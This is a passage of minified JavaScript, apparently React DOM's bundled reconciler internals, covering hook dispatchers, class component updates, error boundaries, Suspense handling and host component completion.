o=Ve.memoizedState;if(i=o.destroy,n!==null&&Nh(n,o.deps)){s.memoizedState=ki(e,r,i,n);return}}Me.flags|=t,s.memoizedState=ki(1|e,r,i,n)}function mm(t,e){return Oo(8390656,8,t,e)}function Eh(t,e){return zl(2048,8,t,e)}function Ig(t,e){return zl(4,2,t,e)}function Lg(t,e){return zl(4,4,t,e)}function Mg(t,e){if(typeof e=="function")return t=t(),e(t),function(){e(null)};if(e!=null)return t=t(),e.current=t,function(){e.current=null}}function Og(t,e,r){return r=r!=null?r.concat([t]):null,zl(4,4,Mg.bind(null,e,t),r)}function Ch(){}function $g(t,e){var r=Qt();e=e===void 0?null:e;var n=r.memoizedState;return n!==null&&e!==null&&Nh(e,n[1])?n[0]:(r.memoizedState=[t,e],t)}function Ug(t,e){var r=Qt();e=e===void 0?null:e;var n=r.memoizedState;return n!==null&&e!==null&&Nh(e,n[1])?n[0]:(t=t(),r.memoizedState=[t,e],t)}function Dg(t,e,r){return gs&21?(dr(r,e)||(r=Hp(),Me.lanes|=r,xs|=r,t.baseState=!0),e):(t.baseState&&(t.baseState=!1,wt=!0),t.memoizedState=r)}function u1(t,e){var r=je;je=r!==0&&4>r?r:4,t(!0);var n=Bc.transition;Bc.transition={};try{t(!1),e()}finally{je=r,Bc.transition=n}}function zg(){return Qt().memoizedState}function h1(t,e,r){var n=vn(t);if(r={lane:n,action:r,hasEagerState:!1,eagerState:null,next:null},Fg(t))Bg(e,r);else if(r=jg(t,e,r,n),r!==null){var s=mt();lr(r,t,n,s),Vg(r,e,n)}}function f1(t,e,r){var n=vn(t),s={lane:n,action:r,hasEagerState:!1,eagerState:null,next:null};if(Fg(t))Bg(e,s);else{var i=t.alternate;if(t.lanes===0&&(i===null||i.lanes===0)&&(i=e.lastRenderedReducer,i!==null))try{var o=e.lastRenderedState,l=i(o,r);if(s.hasEagerState=!0,s.eagerState=l,dr(l,o)){var c=e.interleaved;c===null?(s.next=s,vh(e)):(s.next=c.next,c.next=s),e.interleaved=s;return}}catch{}finally{}r=jg(t,e,s,n),r!==null&&(s=mt(),lr(r,t,n,s),Vg(r,e,n))}}function Fg(t){var e=t.alternate;return t===Me||e!==null&&e===Me}function Bg(t,e){si=dl=!0;var r=t.pending;r===null?e.next=e:(e.next=r.next,r.next=e),t.pending=e}function Vg(t,e,r){if(r&4194240){var n=e.lanes;n&=t.pendingLanes,r|=n,e.lanes=r,ah(t,r)}}var ul={readContext:qt,useCallback:nt,useContext:nt,useEffect:nt,useImperativeHandle:nt,useInsertionEffect:nt,useLayoutEffect:nt,useMemo:nt,useReducer:nt,useRef:nt,useState:nt,useDebugValue:nt,useDeferredValue:nt,useTransition:nt,useMutableSource:nt,useSyncExternalStore:nt,useId:nt,unstable_isNewReconciler:!1},m1={readContext:qt,useCallback:function(t,e){return yr().memoizedState=[t,e===void 0?null:e],t},useContext:qt,useEffect:mm,useImperativeHandle:function(t,e,r){return r=r!=null?r.concat([t]):null,Oo(4194308,4,Mg.bind(null,e,t),r)},useLayoutEffect:function(t,e){return Oo(4194308,4,t,e)},useInsertionEffect:function(t,e){return Oo(4,2,t,e)},useMemo:function(t,e){var r=yr();return e=e===void 0?null:e,t=t(),r.memoizedState=[t,e],t},useReducer:function(t,e,r){var n=yr();return e=r!==void 0?r(e):e,n.memoizedState=n.baseState=e,t={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:t,lastRenderedState:e},n.queue=t,t=t.dispatch=h1.bind(null,Me,t),[n.memoizedState,t]},useRef:function(t){var e=yr();return t={current:t},e.memoizedState=t},useState:fm,useDebugValue:Ch,useDeferredValue:function(t){return yr().memoizedState=t},useTransition:function(){var t=fm(!1),e=t[0];return t=u1.bind(null,t[1]),yr().memoizedState=t,[e,t]},useMutableSource:function(){},useSyncExternalStore:function(t,e,r){var n=Me,s=yr();if(Ie){if(r===void 0)throw Error(D(407));r=r()}else{if(r=e(),Qe===null)throw Error(D(349));gs&30||Eg(n,e,r)}s.memoizedState=r;var i={value:r,getSnapshot:e};return s.queue=i,mm(Tg.bind(null,n,i,t),[t]),n.flags|=2048,ki(9,Cg.bind(null,n,i,r,e),void 0,null),r},useId:function(){var t=yr(),e=Qe.identifierPrefix;if(Ie){var r=Or,n=Mr;r=(n&~(1<<32-or(n)-1)).toString(32)+r,e=":"+e+"R"+r,r=Ni++,0<r&&(e+="H"+r.toString(32)),e+=":"}else r=d1++,e=":"+e+"r"+r.toString(32)+":";return t.memoizedState=e},unstable_isNewReconciler:!1},p1={readContext:qt,useCallback:$g,useContext:qt,useEffect:Eh,useImperativeHandle:Og,useInsertionEffect:Ig,useLayoutEffect:Lg,useMemo:Ug,useReducer:Vc,useRef:Rg,useState:function(){return Vc(Si)},useDebugValue:Ch,useDeferredValue:function(t){var e=Qt();return Dg(e,Ve.memoizedState,t)},useTransition:function(){var t=Vc(Si)[0],e=Qt().memoizedState;return[t,e]},useMutableSource:Sg,useSyncExternalStore:kg,useId:zg,unstable_isNewReconciler:!1},g1={readContext:qt,useCallback:$g,useContext:qt,useEffect:Eh,useImperativeHandle:Og,useInsertionEffect:Ig,useLayoutEffect:Lg,useMemo:Ug,useReducer:Hc,useRef:Rg,useState:function(){return Hc(Si)},useDebugValue:Ch,useDeferredValue:function(t){var e=Qt();return Ve===null?e.memoizedState=t:Dg(e,Ve.memoizedState,t)},useTransition:function(){var t=Hc(Si)[0],e=Qt().memoizedState;return[t,e]},useMutableSource:Sg,useSyncExternalStore:kg,useId:zg,unstable_isNewReconciler:!1};function Zt(t,e){if(t&&t.defaultProps){e=Oe({},e),t=t.defaultProps;for(var r in t)e[r]===void 0&&(e[r]=t[r]);return e}return e}function Bd(t,e,r,n){e=t.memoizedState,r=r(n,e),r=r==null?e:Oe({},e,r),t.memoizedState=r,t.lanes===0&&(t.updateQueue.baseState=r)}var Fl={isMounted:function(t){return(t=t._reactInternals)?ws(t)===t:!1},enqueueSetState:function(t,e,r){t=t._reactInternals;var n=mt(),s=vn(t),i=$r(n,s);i.payload=e,r!=null&&(i.callback=r),e=xn(t,i,s),e!==null&&(lr(e,t,s,n),Lo(e,t,s))},enqueueReplaceState:function(t,e,r){t=t._reactInternals;var n=mt(),s=vn(t),i=$r(n,s);i.tag=1,i.payload=e,r!=null&&(i.callback=r),e=xn(t,i,s),e!==null&&(lr(e,t,s,n),Lo(e,t,s))},enqueueForceUpdate:function(t,e){t=t._reactInternals;var r=mt(),n=vn(t),s=$r(r,n);s.tag=2,e!=null&&(s.callback=e),e=xn(t,s,n),e!==null&&(lr(e,t,n,r),Lo(e,t,n))}};function pm(t,e,r,n,s,i,o){return t=t.stateNode,typeof t.shouldComponentUpdate=="function"?t.shouldComponentUpdate(n,i,o):e.prototype&&e.prototype.isPureReactComponent?!yi(r,n)||!yi(s,i):!0}function Hg(t,e,r){var n=!1,s=jn,i=e.contextType;return typeof i=="object"&&i!==null?i=qt(i):(s=_t(e)?ms:dt.current,n=e.contextTypes,i=(n=n!=null)?ma(t,s):jn),e=new e(r,i),t.memoizedState=e.state!==null&&e.state!==void 0?e.state:null,e.updater=Fl,t.stateNode=e,e._reactInternals=t,n&&(t=t.stateNode,t.__reactInternalMemoizedUnmaskedChildContext=s,t.__reactInternalMemoizedMaskedChildContext=i),e}function gm(t,e,r,n){t=e.state,typeof e.componentWillReceiveProps=="function"&&e.componentWillReceiveProps(r,n),typeof e.UNSAFE_componentWillReceiveProps=="function"&&e.UNSAFE_componentWillReceiveProps(r,n),e.state!==t&&Fl.enqueueReplaceState(e,e.state,null)}function Vd(t,e,r,n){var s=t.stateNode;s.props=r,s.state=t.memoizedState,s.refs={},bh(t);var i=e.contextType;typeof i=="object"&&i!==null?s.context=qt(i):(i=_t(e)?ms:dt.current,s.context=ma(t,i)),s.state=t.memoizedState,i=e.getDerivedStateFromProps,typeof i=="function"&&(Bd(t,e,i,r),s.state=t.memoizedState),typeof e.getDerivedStateFromProps=="function"||typeof s.getSnapshotBeforeUpdate=="function"||typeof s.UNSAFE_componentWillMount!="function"&&typeof s.componentWillMount!="function"||(e=s.state,typeof s.componentWillMount=="function"&&s.componentWillMount(),typeof s.UNSAFE_componentWillMount=="function"&&s.UNSAFE_componentWillMount(),e!==s.state&&Fl.enqueueReplaceState(s,s.state,null),ll(t,r,s,n),s.state=t.memoizedState),typeof s.componentDidMount=="function"&&(t.flags|=4194308)}function ya(t,e){try{var r="",n=e;do r+=Hb(n),n=n.return;while(n);var s=r}catch(i){s=`
Error generating stack: `+i.message+`
`+i.stack}return{value:t,source:e,stack:s,digest:null}}function Gc(t,e,r){return{value:t,source:null,stack:r??null,digest:e??null}}function Hd(t,e){try{console.error(e.value)}catch(r){setTimeout(function(){throw r})}}var x1=typeof WeakMap=="function"?WeakMap:Map;function Gg(t,e,r){r=$r(-1,r),r.tag=3,r.payload={element:null};var n=e.value;return r.callback=function(){fl||(fl=!0,eu=n),Hd(t,e)},r}function Wg(t,e,r){r=$r(-1,r),r.tag=3;var n=t.type.getDerivedStateFromError;if(typeof n=="function"){var s=e.value;r.payload=function(){return n(s)},r.callback=function(){Hd(t,e)}}var i=t.stateNode;return i!==null&&typeof i.componentDidCatch=="function"&&(r.callback=function(){Hd(t,e),typeof n!="function"&&(yn===null?yn=new Set([this]):yn.add(this));var o=e.stack;this.componentDidCatch(e.value,{componentStack:o!==null?o:""})}),r}function xm(t,e,r){var n=t.pingCache;if(n===null){n=t.pingCache=new x1;var s=new Set;n.set(e,s)}else s=n.get(e),s===void 0&&(s=new Set,n.set(e,s));s.has(r)||(s.add(r),t=A1.bind(null,t,e,r),e.then(t,t))}function ym(t){do{var e;if((e=t.tag===13)&&(e=t.memoizedState,e=e!==null?e.dehydrated!==null:!0),e)return t;t=t.return}while(t!==null);return null}function vm(t,e,r,n,s){return t.mode&1?(t.flags|=65536,t.lanes=s,t):(t===e?t.flags|=65536:(t.flags|=128,r.flags|=131072,r.flags&=-52805,r.tag===1&&(r.alternate===null?r.tag=17:(e=$r(-1,1),e.tag=2,xn(r,e,1))),r.lanes|=1),t)}var y1=Gr.ReactCurrentOwner,wt=!1;function ht(t,e,r,n){e.child=t===null?wg(e,null,r,n):ga(e,t.child,r,n)}function bm(t,e,r,n,s){r=r.render;var i=e.ref;return Zs(e,s),n=Sh(t,e,r,n,i,s),r=kh(),t!==null&&!wt?(e.updateQueue=t.updateQueue,e.flags&=-2053,t.lanes&=~s,Br(t,e,s)):(Ie&&r&&fh(e),e.flags|=1,ht(t,e,n,s),e.child)}function wm(t,e,r,n,s){if(t===null){var i=r.type;return typeof i=="function"&&!Oh(i)&&i.defaultProps===void 0&&r.compare===null&&r.defaultProps===void 0?(e.tag=15,e.type=i,Kg(t,e,i,n,s)):(t=zo(r.type,null,n,e,e.mode,s),t.ref=e.ref,t.return=e,e.child=t)}if(i=t.child,!(t.lanes&s)){var o=i.memoizedProps;if(r=r.compare,r=r!==null?r:yi,r(o,n)&&t.ref===e.ref)return Br(t,e,s)}return e.flags|=1,t=bn(i,n),t.ref=e.ref,t.return=e,e.child=t}function Kg(t,e,r,n,s){if(t!==null){var i=t.memoizedProps;if(yi(i,n)&&t.ref===e.ref)if(wt=!1,e.pendingProps=n=i,(t.lanes&s)!==0)t.flags&131072&&(wt=!0);else return e.lanes=t.lanes,Br(t,e,s)}return Gd(t,e,r,n,s)}function qg(t,e,r){var n=e.pendingProps,s=n.children,i=t!==null?t.memoizedState:null;if(n.mode==="hidden")if(!(e.mode&1))e.memoizedState={baseLanes:0,cachePool:null,transitions:null},Ce(Ks,Ct),Ct|=r;else{if(!(r&1073741824))return t=i!==null?i.baseLanes|r:r,e.lanes=e.childLanes=1073741824,e.memoizedState={baseLanes:t,cachePool:null,transitions:null},e.updateQueue=null,Ce(Ks,Ct),Ct|=t,null;e.memoizedState={baseLanes:0,cachePool:null,transitions:null},n=i!==null?i.baseLanes:r,Ce(Ks,Ct),Ct|=n}else i!==null?(n=i.baseLanes|r,e.memoizedState=null):n=r,Ce(Ks,Ct),Ct|=n;return ht(t,e,s,r),e.child}function Qg(t,e){var r=e.ref;(t===null&&r!==null||t!==null&&t.ref!==r)&&(e.flags|=512,e.flags|=2097152)}function Gd(t,e,r,n,s){var i=_t(r)?ms:dt.current;return i=ma(e,i),Zs(e,s),r=Sh(t,e,r,n,i,s),n=kh(),t!==null&&!wt?(e.updateQueue=t.updateQueue,e.flags&=-2053,t.lanes&=~s,Br(t,e,s)):(Ie&&n&&fh(e),e.flags|=1,ht(t,e,r,s),e.child)}function jm(t,e,r,n,s){if(_t(r)){var i=!0;nl(e)}else i=!1;if(Zs(e,s),e.stateNode===null)$o(t,e),Hg(e,r,n),Vd(e,r,n,s),n=!0;else if(t===null){var o=e.stateNode,l=e.memoizedProps;o.props=l;var c=o.context,d=r.contextType;typeof d=="object"&&d!==null?d=qt(d):(d=_t(r)?ms:dt.current,d=ma(e,d));var u=r.getDerivedStateFromProps,h=typeof u=="function"||typeof o.getSnapshotBeforeUpdate=="function";h||typeof o.UNSAFE_componentWillReceiveProps!="function"&&typeof o.componentWillReceiveProps!="function"||(l!==n||c!==d)&&gm(e,o,n,d),en=!1;var f=e.memoizedState;o.state=f,ll(e,n,o,s),c=e.memoizedState,l!==n||f!==c||jt.current||en?(typeof u=="function"&&(Bd(e,r,u,n),c=e.memoizedState),(l=en||pm(e,r,l,n,f,c,d))?(h||typeof o.UNSAFE_componentWillMount!="function"&&typeof o.componentWillMount!="function"||(typeof o.componentWillMount=="function"&&o.componentWillMount(),typeof o.UNSAFE_componentWillMount=="function"&&o.UNSAFE_componentWillMount()),typeof o.componentDidMount=="function"&&(e.flags|=4194308)):(typeof o.componentDidMount=="function"&&(e.flags|=4194308),e.memoizedProps=n,e.memoizedState=c),o.props=n,o.state=c,o.context=d,n=l):(typeof o.componentDidMount=="function"&&(e.flags|=4194308),n=!1)}else{o=e.stateNode,_g(t,e),l=e.memoizedProps,d=e.type===e.elementType?l:Zt(e.type,l),o.props=d,h=e.pendingProps,f=o.context,c=r.contextType,typeof c=="object"&&c!==null?c=qt(c):(c=_t(r)?ms:dt.current,c=ma(e,c));var m=r.getDerivedStateFromProps;(u=typeof m=="function"||typeof o.getSnapshotBeforeUpdate=="function")||typeof o.UNSAFE_componentWillReceiveProps!="function"&&typeof o.componentWillReceiveProps!="function"||(l!==h||f!==c)&&gm(e,o,n,c),en=!1,f=e.memoizedState,o.state=f,ll(e,n,o,s);var g=e.memoizedState;l!==h||f!==g||jt.current||en?(typeof m=="function"&&(Bd(e,r,m,n),g=e.memoizedState),(d=en||pm(e,r,d,n,f,g,c)||!1)?(u||typeof o.UNSAFE_componentWillUpdate!="function"&&typeof o.componentWillUpdate!="function"||(typeof o.componentWillUpdate=="function"&&o.componentWillUpdate(n,g,c),typeof o.UNSAFE_componentWillUpdate=="function"&&o.UNSAFE_componentWillUpdate(n,g,c)),typeof o.componentDidUpdate=="function"&&(e.flags|=4),typeof o.getSnapshotBeforeUpdate=="function"&&(e.flags|=1024)):(typeof o.componentDidUpdate!="function"||l===t.memoizedProps&&f===t.memoizedState||(e.flags|=4),typeof o.getSnapshotBeforeUpdate!="function"||l===t.memoizedProps&&f===t.memoizedState||(e.flags|=1024),e.memoizedProps=n,e.memoizedState=g),o.props=n,o.state=g,o.context=c,n=d):(typeof o.componentDidUpdate!="function"||l===t.memoizedProps&&f===t.memoizedState||(e.flags|=4),typeof o.getSnapshotBeforeUpdate!="function"||l===t.memoizedProps&&f===t.memoizedState||(e.flags|=1024),n=!1)}return Wd(t,e,r,n,i,s)}function Wd(t,e,r,n,s,i){Qg(t,e);var o=(e.flags&128)!==0;if(!n&&!o)return s&&om(e,r,!1),Br(t,e,i);n=e.stateNode,y1.current=e;var l=o&&typeof r.getDerivedStateFromError!="function"?null:n.render();return e.flags|=1,t!==null&&o?(e.child=ga(e,t.child,null,i),e.child=ga(e,null,l,i)):ht(t,e,l,i),e.memoizedState=n.state,s&&om(e,r,!0),e.child}function Yg(t){var e=t.stateNode;e.pendingContext?im(t,e.pendingContext,e.pendingContext!==e.context):e.context&&im(t,e.context,!1),wh(t,e.containerInfo)}function _m(t,e,r,n,s){return pa(),ph(s),e.flags|=256,ht(t,e,r,n),e.child}var Kd={dehydrated:null,treeContext:null,retryLane:0};function qd(t){return{baseLanes:t,cachePool:null,transitions:null}}function Jg(t,e,r){var n=e.pendingProps,s=Le.current,i=!1,o=(e.flags&128)!==0,l;if((l=o)||(l=t!==null&&t.memoizedState===null?!1:(s&2)!==0),l?(i=!0,e.flags&=-129):(t===null||t.memoizedState!==null)&&(s|=1),Ce(Le,s&1),t===null)return zd(e),t=e.memoizedState,t!==null&&(t=t.dehydrated,t!==null)?(e.mode&1?t.data==="$!"?e.lanes=8:e.lanes=1073741824:e.lanes=1,null):(o=n.children,t=n.fallback,i?(n=e.mode,i=e.child,o={mode:"hidden",children:o},!(n&1)&&i!==null?(i.childLanes=0,i.pendingProps=o):i=Hl(o,n,0,null),t=hs(t,n,r,null),i.return=e,t.return=e,i.sibling=t,e.child=i,e.child.memoizedState=qd(r),e.memoizedState=Kd,t):Th(e,o));if(s=t.memoizedState,s!==null&&(l=s.dehydrated,l!==null))return v1(t,e,o,n,l,s,r);if(i){i=n.fallback,o=e.mode,s=t.child,l=s.sibling;var c={mode:"hidden",children:n.children};return!(o&1)&&e.child!==s?(n=e.child,n.childLanes=0,n.pendingProps=c,e.deletions=null):(n=bn(s,c),n.subtreeFlags=s.subtreeFlags&14680064),l!==null?i=bn(l,i):(i=hs(i,o,r,null),i.flags|=2),i.return=e,n.return=e,n.sibling=i,e.child=n,n=i,i=e.child,o=t.child.memoizedState,o=o===null?qd(r):{baseLanes:o.baseLanes|r,cachePool:null,transitions:o.transitions},i.memoizedState=o,i.childLanes=t.childLanes&~r,e.memoizedState=Kd,n}return i=t.child,t=i.sibling,n=bn(i,{mode:"visible",children:n.children}),!(e.mode&1)&&(n.lanes=r),n.return=e,n.sibling=null,t!==null&&(r=e.deletions,r===null?(e.deletions=[t],e.flags|=16):r.push(t)),e.child=n,e.memoizedState=null,n}function Th(t,e){return e=Hl({mode:"visible",children:e},t.mode,0,null),e.return=t,t.child=e}function go(t,e,r,n){return n!==null&&ph(n),ga(e,t.child,null,r),t=Th(e,e.pendingProps.children),t.flags|=2,e.memoizedState=null,t}function v1(t,e,r,n,s,i,o){if(r)return e.flags&256?(e.flags&=-257,n=Gc(Error(D(422))),go(t,e,o,n)):e.memoizedState!==null?(e.child=t.child,e.flags|=128,null):(i=n.fallback,s=e.mode,n=Hl({mode:"visible",children:n.children},s,0,null),i=hs(i,s,o,null),i.flags|=2,n.return=e,i.return=e,n.sibling=i,e.child=n,e.mode&1&&ga(e,t.child,null,o),e.child.memoizedState=qd(o),e.memoizedState=Kd,i);if(!(e.mode&1))return go(t,e,o,null);if(s.data==="$!"){if(n=s.nextSibling&&s.nextSibling.dataset,n)var l=n.dgst;return n=l,i=Error(D(419)),n=Gc(i,n,void 0),go(t,e,o,n)}if(l=(o&t.childLanes)!==0,wt||l){if(n=Qe,n!==null){switch(o&-o){case 4:s=2;break;case 16:s=8;break;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:s=32;break;case 536870912:s=268435456;break;default:s=0}s=s&(n.suspendedLanes|o)?0:s,s!==0&&s!==i.retryLane&&(i.retryLane=s,Fr(t,s),lr(n,t,s,-1))}return Mh(),n=Gc(Error(D(421))),go(t,e,o,n)}return s.data==="$?"?(e.flags|=128,e.child=t.child,e=R1.bind(null,t),s._reactRetry=e,null):(t=i.treeContext,Pt=gn(s.nextSibling),At=e,Ie=!0,sr=null,t!==null&&(zt[Ft++]=Mr,zt[Ft++]=Or,zt[Ft++]=ps,Mr=t.id,Or=t.overflow,ps=e),e=Th(e,n.children),e.flags|=4096,e)}function Nm(t,e,r){t.lanes|=e;var n=t.alternate;n!==null&&(n.lanes|=e),Fd(t.return,e,r)}function Wc(t,e,r,n,s){var i=t.memoizedState;i===null?t.memoizedState={isBackwards:e,rendering:null,renderingStartTime:0,last:n,tail:r,tailMode:s}:(i.isBackwards=e,i.rendering=null,i.renderingStartTime=0,i.last=n,i.tail=r,i.tailMode=s)}function Xg(t,e,r){var n=e.pendingProps,s=n.revealOrder,i=n.tail;if(ht(t,e,n.children,r),n=Le.current,n&2)n=n&1|2,e.flags|=128;else{if(t!==null&&t.flags&128)e:for(t=e.child;t!==null;){if(t.tag===13)t.memoizedState!==null&&Nm(t,r,e);else if(t.tag===19)Nm(t,r,e);else if(t.child!==null){t.child.return=t,t=t.child;continue}if(t===e)break e;for(;t.sibling===null;){if(t.return===null||t.return===e)break e;t=t.return}t.sibling.return=t.return,t=t.sibling}n&=1}if(Ce(Le,n),!(e.mode&1))e.memoizedState=null;else switch(s){case"forwards":for(r=e.child,s=null;r!==null;)t=r.alternate,t!==null&&cl(t)===null&&(s=r),r=r.sibling;r=s,r===null?(s=e.child,e.child=null):(s=r.sibling,r.sibling=null),Wc(e,!1,s,r,i);break;case"backwards":for(r=null,s=e.child,e.child=null;s!==null;){if(t=s.alternate,t!==null&&cl(t)===null){e.child=s;break}t=s.sibling,s.sibling=r,r=s,s=t}Wc(e,!0,r,null,i);break;case"together":Wc(e,!1,null,null,void 0);break;default:e.memoizedState=null}return e.child}function $o(t,e){!(e.mode&1)&&t!==null&&(t.alternate=null,e.alternate=null,e.flags|=2)}function Br(t,e,r){if(t!==null&&(e.dependencies=t.dependencies),xs|=e.lanes,!(r&e.childLanes))return null;if(t!==null&&e.child!==t.child)throw Error(D(153));if(e.child!==null){for(t=e.child,r=bn(t,t.pendingProps),e.child=r,r.return=e;t.sibling!==null;)t=t.sibling,r=r.sibling=bn(t,t.pendingProps),r.return=e;r.sibling=null}return e.child}function b1(t,e,r){switch(e.tag){case 3:Yg(e),pa();break;case 5:Ng(e);break;case 1:_t(e.type)&&nl(e);break;case 4:wh(e,e.stateNode.containerInfo);break;case 10:var n=e.type._context,s=e.memoizedProps.value;Ce(il,n._currentValue),n._currentValue=s;break;case 13:if(n=e.memoizedState,n!==null)return n.dehydrated!==null?(Ce(Le,Le.current&1),e.flags|=128,null):r&e.child.childLanes?Jg(t,e,r):(Ce(Le,Le.current&1),t=Br(t,e,r),t!==null?t.sibling:null);Ce(Le,Le.current&1);break;case 19:if(n=(r&e.childLanes)!==0,t.flags&128){if(n)return Xg(t,e,r);e.flags|=128}if(s=e.memoizedState,s!==null&&(s.rendering=null,s.tail=null,s.lastEffect=null),Ce(Le,Le.current),n)break;return null;case 22:case 23:return e.lanes=0,qg(t,e,r)}return Br(t,e,r)}var Zg,Qd,ex,tx;Zg=function(t,e){for(var r=e.child;r!==null;){if(r.tag===5||r.tag===6)t.appendChild(r.stateNode);else if(r.tag!==4&&r.child!==null){r.child.return=r,r=r.child;continue}if(r===e)break;for(;r.sibling===null;){if(r.return===null||r.return===e)return;r=r.return}r.sibling.return=r.return,r=r.sibling}};Qd=function(){};ex=function(t,e,r,n){var s=t.memoizedProps;if(s!==n){t=e.stateNode,as(Sr.current);var i=null;switch(r){case"input":s=xd(t,s),n=xd(t,n),i=[];break;case"select":s=Oe({},s,{value:void 0}),n=Oe({},n,{value:void 0}),i=[];break;case"textarea":s=bd(t,s),n=bd(t,n),i=[];break;default:typeof s.onClick!="function"&&typeof n.onClick=="function"&&(t.onclick=tl)}jd(r,n);var o;r=null;for(d in s)if(!n.hasOwnProperty(d)&&s.hasOwnProperty(d)&&s[d]!=null)if(d==="style"){var l=s[d];for(o in l)l.hasOwnProperty(o)&&(r||(r={}),r[o]="")}else d!=="dangerouslySetInnerHTML"&&d!=="children"&&d!=="suppressContentEditableWarning"&&d!=="suppressHydrationWarning"&&d!=="autoFocus"&&(ui.hasOwnProperty(d)?i||(i=[]):(i=i||[]).push(d,null));for(d in n){var c=n[d];if(l=s!=null?s[d]:void 0,n.hasOwnProperty(d)&&c!==l&&(c!=null||l!=null))if(d==="style")if(l){for(o in l)!l.hasOwnProperty(o)||c&&c.hasOwnProperty(o)||(r||(r={}),r[o]="");for(o in c)c.hasOwnProperty(o)&&l[o]!==c[o]&&(r||(r={}),r[o]=c[o])}else r||(i||(i=[]),i.push(d,r)),r=c;else d==="dangerouslySetInnerHTML"?(c=c?c.__html:void 0,l=l?l.__html:void 0,c!=null&&l!==c&&(i=i||[]).push(d,c)):d==="children"?typeof c!="string"&&typeof c!="number"||(i=i||[]).push(d,""+c):d!=="suppressContentEditableWarning"&&d!=="suppressHydrationWarning"&&(ui.hasOwnProperty(d)?(c!=null&&d==="onScroll"&&Ae("scroll",t),i||l===c||(i=[])):(i=i||[]).push(d,c))}r&&(i=i||[]).push("style",r);var d=i;(e.updateQueue=d)&&(e.flags|=4)}};tx=function(t,e,r,n){r!==n&&(e.flags|=4)};function Ba(t,e){if(!Ie)switch(t.tailMode){case"hidden":e=t.tail;for(var r=null;e!==null;)e.alternate!==null&&(r=e),e=e.sibling;r===null?t.tail=null:r.sibling=null;break;case"collapsed":r=t.tail;for(var n=null;r!==null;)r.alternate!==null&&(n=r),r=r.sibling;n===null?e||t.tail===null?t.tail=null:t.tail.sibling=null:n.sibling=null}}function st(t){var e=t.alternate!==null&&t.alternate.child===t.child,r=0,n=0;if(e)for(var s=t.child;s!==null;)r|=s.lanes|s.childLanes,n|=s.subtreeFlags&14680064,n|=s.flags&14680064,s.return=t,s=s.sibling;else for(s=t.child;s!==null;)r|=s.lanes|s.childLanes,n|=s.subtreeFlags,n|=s.flags,s.return=t,s=s.sibling;return t.subtreeFlags|=n,t.childLanes=r,e}function w1(t,e,r){var n=e.pendingProps;switch(mh(e),e.tag){case 2:case 16:case 15:case 0:case 11:case 7:case 8:case 12:case 9:case 14:return st(e),null;case 1:return _t(e.type)&&rl(),st(e),null;case 3:return n=e.stateNode,xa(),Re(jt),Re(dt),_h(),n.pendingContext&&(n.context=n.pendingContext,n.pendingContext=null),(t===null||t.child===null)&&(mo(e)?e.flags|=4:t===null||t.memoizedState.isDehydrated&&!(e.flags&256)||(e.flags|=1024,sr!==null&&(nu(sr),sr=null))),Qd(t,e),st(e),null;case 5:jh(e);var s=as(_i.current);if(r=e.type,t!==null&&e.stateNode!=null)ex(t,e,r,n,s),t.ref!==e.ref&&(e.flags|=512,e.flags|=2097152);else{if(!n){if(e.stateNode===null)throw Error(D(166));return st(e),null}if(t=as(Sr.current),mo(e)){n=e.stateNode,r=e.type;var i=e.memoizedProps;switch(n[_r]=e,n[wi]=i,t=(e.mode&1)!==0,r){case"dialog":Ae("cancel",n),Ae("close",n);break;case"iframe":case"object":case"embed":Ae("load",n);break;case"video":case"audio":for(s=0;s<Ja.length;s++)Ae(Ja[s],n);break;case"source":Ae("error",n);break;case"img":case"image":case"link":Ae("error",n),Ae("load",n);break;case"details":Ae("toggle",n);break;case"input":If(n,i),Ae("invalid",n);break;case"select":n._wrapperState={wasMultiple:!!i.multiple},Ae("invalid",n);break;case"textarea":Mf(n,i),Ae("invalid",n)}jd(r,i),s=null;for(var o in i)if(i.hasOwnProperty(o)){var l=i[o];o==="children"?typeof l=="string"?n.textContent!==l&&(i.suppressHydrationWarning!==!0&&fo(n.textContent,l,t),s=["children",l]):typeof l=="number"&&n.textContent!==""+l&&(i.suppressHydrationWarning!==!0&&fo(n.textContent,l,t),s=["children",""+l]):ui.hasOwnProperty(o)&&l!=null&&o==="onScroll"&&Ae("scroll",n)}switch(r){case"input":so(n),Lf(n,i,!0);break;case"textarea":so(n),Of(n);break;case"select":case"option":break;default:typeof i.onClick=="function"&&(n.onclick=tl)}n=s,e.updateQueue=n,n!==null&&(e.flags|=4)}else{o=s.nodeType===9?s:s.ownerDocument,t==="http://www.w3.org/1999/xhtml"&&(t=Tp(r)),t==="http://www.w3.org/1999/xhtml"?r==="script"?(t=o.createElement("div"),t.innerHTML="<script><\/script>",t=t.removeChild(t.firstChild)):typeof n.is=="string"?t=o.createElement(r,{is:n.is}):(t=o.createElement(r),r==="select"&&(o=t,n.multiple?o.multiple=!0:n.size&&(o.size=n.size))):t=o.createElementNS(t,r),t[_r]=e,t[wi]=n,Zg(t,e,!1,!1),e.stateNode=t;e:{switch(o=_d(r,n),r){case"dialog":Ae("cancel",t),Ae("close",t),s=n;break;case"iframe":case"object":case"embed":Ae("load",t),s=n;break;case"video":case"audio":for(s=0;s<Ja.length;s++)Ae(Ja[s],t);s=n;break;case"source":Ae("error",t),s=n;break;case"img":case"image":case"link":Ae("error",t),Ae("load",t),s=n;break;case"details":Ae("toggle",t),s=n;break;case"input":If(t,n),s=xd(t,n),Ae("invalid",t);break;case"option":s=n;break;case"select":t._wrapperState={wasMultiple:!!n.multiple},s=Oe({},n,{value:void 0}),Ae("invalid",t);break;case"textarea":Mf(t,n),s=bd(t,n),Ae("invalid",t);break;default:s=n}jd(r,s),l=s;for(i in l)if(l.hasOwnProperty(i)){var c=l[i];i==="style"?Rp(t,c):i==="dangerouslySetInnerHTML"?(c=c?c.__html:void 0,c!=null&&Pp(t,c)):i==="children"?typeof c=="string"?(r!=="textarea"||c!=="")&&hi(t,c):typeof 